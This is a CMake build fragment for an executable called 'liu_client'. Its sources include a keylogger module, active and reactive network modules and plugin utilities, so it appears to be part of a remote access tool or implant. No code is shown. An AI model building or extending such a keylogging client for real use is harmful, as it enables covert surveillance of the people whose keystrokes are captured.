add_executable(liu_client
    ${SRC_DIR}/core.c
    ${SRC_DIR}/keylogger.c
    ${SRC_DIR}/network_active.c
    ${SRC_DIR}/network_reactive.c
    ${SRC_DIR}/network_utils.c
    ${SRC_DIR}/plugin_utils.c
    ${SRC_DIR}/system_utils.c    
)

target_include_directories(liu_client 
    PRIVATE ${INC_DIR}
)

target_link_libraries(liu_client 
    dl
    pthread
    rt
    crypto
    ${LIB_DIR}/libhydrogen.a
)